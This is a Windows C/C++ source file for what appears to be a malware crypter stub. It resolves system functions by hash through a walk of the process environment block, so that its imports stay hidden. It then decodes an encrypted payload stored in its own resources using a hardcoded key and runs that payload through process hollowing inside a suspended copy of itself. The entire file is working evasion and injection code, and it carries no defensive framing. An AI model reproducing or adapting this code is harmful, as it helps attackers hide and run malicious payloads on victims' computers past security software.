#include <Windows.h>
#include <stdio.h>
// MemoryExec Functions
typedef bool (__stdcall *CreateProcess_)(wchar_t *, wchar_t *, int, int, int, unsigned long, void *, wchar_t *, _STARTUPINFOW *, _PROCESS_INFORMATION *);
typedef void * (__stdcall *VirtualAllocEx_)(void *, void *, SIZE_T, unsigned long, unsigned long);
typedef long (__stdcall *NtUnmapViewOfSection_)(void *, void *);
typedef int (__stdcall *NtWriteVirtualMemory_)(void *, void *, void *, unsigned long, unsigned long *);
typedef int (__stdcall *NtGetContextThread_)(void *, _CONTEXT *);
typedef int (__stdcall *NtSetContextThread_)(void *, _CONTEXT *);
typedef int (__stdcall *NtResumeThread_)(void *, unsigned long *);

// Other Functions
typedef unsigned long (__stdcall *LoadLibrary_)(const wchar_t *);
typedef unsigned long (__stdcall *GetModuleFileName_)(HINSTANCE__ *, wchar_t*, unsigned long);
typedef HRSRC__ * (__stdcall *FindResource_)(HINSTANCE__ *, wchar_t*, wchar_t*); 
typedef void * (__stdcall *LoadResource_)(HINSTANCE__ *, HRSRC__ *); 
typedef unsigned long (__stdcall *SizeofResource_)(HMODULE, HRSRC);

CreateProcess_ _CreateProcess = NULL;
VirtualAllocEx_ _VirtualAllocEx = NULL;
NtUnmapViewOfSection_ _NtUnmapViewOfSection = NULL;
NtWriteVirtualMemory_ _NtWriteVirtualMemory = NULL;
NtGetContextThread_ _NtGetContextThread = NULL;
NtSetContextThread_ _NtSetContextThread = NULL;
NtResumeThread_ _NtResumeThread = NULL;

LoadLibrary_ _LoadLibrary = NULL;
GetModuleFileName_ _GetModuleFileName = NULL;
FindResource_ _FindResource = NULL;
LoadResource_ _LoadResource = NULL;
SizeofResource_ _SizeofResource = NULL;

const wchar_t KERNEL32[] = L"KERNEL32.DLL";
const wchar_t NTDLL[] = L"NTDLL.DLL";

void WINAPI MemoryExec(LPBYTE lpFile, LPWSTR lpProcess)
{
	PIMAGE_SECTION_HEADER Image_Section_Header;

	PIMAGE_DOS_HEADER Image_Dos_Header = (PIMAGE_DOS_HEADER)&lpFile[0];
	
	PIMAGE_NT_HEADERS Image_Nt_Headers = (PIMAGE_NT_HEADERS)&lpFile[Image_Dos_Header->e_lfanew];

	PROCESS_INFORMATION Process_Information;
	
	CONTEXT Context;

	STARTUPINFO StartupInfo;

	RtlZeroMemory(&StartupInfo, sizeof(StartupInfo));

	StartupInfo.cb = sizeof(STARTUPINFO);

	Context.ContextFlags = CONTEXT_FULL;

		_CreateProcess(NULL, lpProcess, NULL, NULL, false, CREATE_SUSPENDED, NULL, NULL, &StartupInfo, &Process_Information);

		_NtUnmapViewOfSection(Process_Information.hProcess, (LPVOID)Image_Nt_Headers->OptionalHeader.ImageBase);

		_VirtualAllocEx(Process_Information.hProcess, (LPVOID) Image_Nt_Headers->OptionalHeader.ImageBase, Image_Nt_Headers->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
		
		_NtWriteVirtualMemory(Process_Information.hProcess, (LPVOID)Image_Nt_Headers->OptionalHeader.ImageBase, &lpFile[0], Image_Nt_Headers->OptionalHeader.SizeOfHeaders, NULL);
	
		for (USHORT i = 0; i < Image_Nt_Headers->FileHeader.NumberOfSections; ++i)
		{
			Image_Section_Header = (PIMAGE_SECTION_HEADER)&lpFile[Image_Dos_Header->e_lfanew + sizeof(IMAGE_NT_HEADERS) + sizeof(IMAGE_SECTION_HEADER) * i];
			
			_NtWriteVirtualMemory(Process_Information.hProcess, (LPVOID)(Image_Nt_Headers->OptionalHeader.ImageBase + Image_Section_Header->VirtualAddress), &lpFile[Image_Section_Header->PointerToRawData], Image_Section_Header->SizeOfRawData, NULL);
		}

		_NtGetContextThread(Process_Information.hThread, &Context);
		
		Context.Eax = Image_Nt_Headers->OptionalHeader.ImageBase + Image_Nt_Headers->OptionalHeader.AddressOfEntryPoint;
		
		_NtSetContextThread(Process_Information.hThread, &Context);
		
		_NtResumeThread(Process_Information.hThread, NULL);
}

DWORD ResolveAPI(DWORD dwModuleBase, DWORD dwFunctionHash)
{
    PIMAGE_DOS_HEADER pImageDosHeader = (PIMAGE_DOS_HEADER)dwModuleBase;
	PIMAGE_FILE_HEADER pImageFileHeader = (PIMAGE_FILE_HEADER)(dwModuleBase + pImageDosHeader->e_lfanew + 4);
    PIMAGE_OPTIONAL_HEADER pImageOptionalHeader = (PIMAGE_OPTIONAL_HEADER)((PBYTE)pImageFileHeader + sizeof(IMAGE_FILE_HEADER));
	PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = (PIMAGE_EXPORT_DIRECTORY)(dwModuleBase + pImageOptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    PDWORD pdwAddressOfNames, pdwAddressOfFunctions;
    PWORD pwAddressOfNameOrdinals;
	DWORD dwX = 0, dwY = 0;
	int mark = 0;
	
    pdwAddressOfNames=(PDWORD)(dwModuleBase + pImageExportDirectory->AddressOfNames);
    pwAddressOfNameOrdinals=(PWORD)(dwModuleBase + pImageExportDirectory->AddressOfNameOrdinals);
    pdwAddressOfFunctions=(PDWORD)(dwModuleBase + pImageExportDirectory->AddressOfFunctions);
        
    for (dwX=0; dwX < pImageExportDirectory->NumberOfNames; dwX++)
    {
        PBYTE pFunctionName=(PBYTE)(dwModuleBase + pdwAddressOfNames[dwX]);
     
        for (dwY=0; *pFunctionName; *pFunctionName++)
        {
            dwY=(dwY + (*(PBYTE)pFunctionName|0x60));

            dwY <<= 1;
        }

        if(dwY == dwFunctionHash)
        {
            return (dwModuleBase + pdwAddressOfFunctions[pwAddressOfNameOrdinals[dwX]]);
        }
    }
    
    return NULL;
}

DWORD dwBaseAddress()
{
	DWORD dwBaseAddress = NULL;

	_asm
	{
		xor ebx, ebx              
		mov ebx, fs:[ 0x30 ]       
		mov ebx, [ ebx + 0x0C ]    
		mov ebx, [ ebx + 0x14 ]    
		mov ebx, [ ebx ]           
		mov ebx, [ ebx ]
		jmp jumpproc
	}

	_asm
	{
jumpproc:
		mov ebx, [ ebx + 0x10 ]    
	    
		mov dwBaseAddress, ebx
	}

	return dwBaseAddress;
}

VOID SetupFunctions()
{
	_LoadLibrary = (LoadLibrary_)ResolveAPI(dwBaseAddress(), 0xd57b2);

	_CreateProcess = (CreateProcess_)ResolveAPI(_LoadLibrary(KERNEL32), 0x33cfc2);

	_VirtualAllocEx = (VirtualAllocEx_)ResolveAPI(_LoadLibrary(KERNEL32), 0x38c78c);

	_NtUnmapViewOfSection = (NtUnmapViewOfSection_)ResolveAPI(_LoadLibrary(NTDLL), 0xe058440);

	_NtWriteVirtualMemory = (NtWriteVirtualMemory_)ResolveAPI(_LoadLibrary(NTDLL), 0xe18a5e2);

	_NtGetContextThread = (NtGetContextThread_)ResolveAPI(_LoadLibrary(NTDLL), 0x370c294);
	
	_NtSetContextThread = (NtSetContextThread_)ResolveAPI(_LoadLibrary(NTDLL), 0x37cc294);

	_NtResumeThread = (NtResumeThread_)ResolveAPI(_LoadLibrary(NTDLL), 0x37d414);

	_GetModuleFileName = (GetModuleFileName_)ResolveAPI(_LoadLibrary(KERNEL32), 0x346a1fa);

	_FindResource = (FindResource_)ResolveAPI(_LoadLibrary(KERNEL32), 0x1a099a);

	_LoadResource = (LoadResource_)ResolveAPI(_LoadLibrary(KERNEL32), 0xd6056);

	_SizeofResource = (SizeofResource_)ResolveAPI(_LoadLibrary(KERNEL32), 0x380c56);
}

void wWinDecode(LPBYTE bytes, DWORD dwBytesLength, LPBYTE k, DWORD dwKeyLength)
{
    UINT i = 0, x = 0;
	
	for (i = 0; i < dwBytesLength; ++i)
	{
		bytes[i] =~ bytes[i] ^ k[x] & i;
		
		if (++x == dwKeyLength) x = 0;
	}
}

BYTE lpKey[] = "2aikoniohf2";
DWORD dwKeyLen = strlen((char *)lpKey);

LPBYTE lpFile = NULL;
DWORD dwFileLen = NULL;

int PASCAL wWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPWSTR lpCmdLine, int nCmdShow)
{
	SetupFunctions();
	
	HRSRC hRsrc = NULL;

	HGLOBAL hGlobal = NULL;

	// File Shits

	hRsrc = _FindResource(NULL, MAKEINTRESOURCE(1), MAKEINTRESOURCE(3));

	dwFileLen = _SizeofResource(NULL, hRsrc);

	hGlobal = _LoadResource(NULL, hRsrc);

	lpFile = LPBYTE(hGlobal);

	// Decode

	wWinDecode(lpFile, dwFileLen, lpKey, dwKeyLen);

	// Get FilePath

	wchar_t szCurrentPath[MAX_PATH];

	_GetModuleFileName(NULL, szCurrentPath, MAX_PATH);

	// Fire!

	MemoryExec(lpFile, szCurrentPath);
	
	return 0;
}